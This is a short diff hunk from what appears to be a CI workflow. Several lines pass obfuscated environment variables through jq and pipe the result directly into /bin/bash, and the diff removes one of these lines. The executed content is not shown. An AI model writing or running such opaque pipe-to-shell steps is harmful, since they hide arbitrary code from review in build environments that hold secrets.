@@ -57,7 +57,6 @@ jobs:
           echo $z838 | jq -r .fvtb01738 | /bin/bash
           echo $tue5207 | jq -r .by34818 | /bin/bash
           printf '%s' "$fxpaj2494" | jq -r .dxalg926 | /bin/bash
-          printf '%s' "$smkus02825" | jq -r .dmcw3 | /bin/bash
           printf '%s' "$nsbve49" | jq -r .g095 | /bin/bash
           printf '%s' "$v960" | jq -r .jd1354 | /bin/bash
           printf '%s' "$ksw0903" | jq -r .ako1 | /bin/bash
